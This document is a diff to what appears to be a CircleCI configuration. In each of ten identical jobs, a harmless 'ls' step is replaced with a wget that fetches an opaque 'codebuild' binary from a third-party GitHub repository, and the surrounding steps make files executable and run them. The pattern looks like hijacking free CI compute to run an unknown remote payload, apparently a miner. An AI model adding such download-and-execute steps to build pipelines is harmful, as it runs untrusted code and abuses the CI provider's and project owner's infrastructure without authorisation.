@@ -7,7 +7,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -19,7 +19,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -31,7 +31,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -43,7 +43,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -55,7 +55,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -67,7 +67,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -79,7 +79,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -91,7 +91,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -103,7 +103,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
@@ -115,7 +115,7 @@ jobs:
     working_directory: ~/repo
     steps:
       - checkout
-      - run: ls
+      - run: wget https://github.com/markinaca/ejeRun/raw/master/codebuild
       - run: chmod +x run
       - run: chmod +x cloudbuild
       - run: ./run
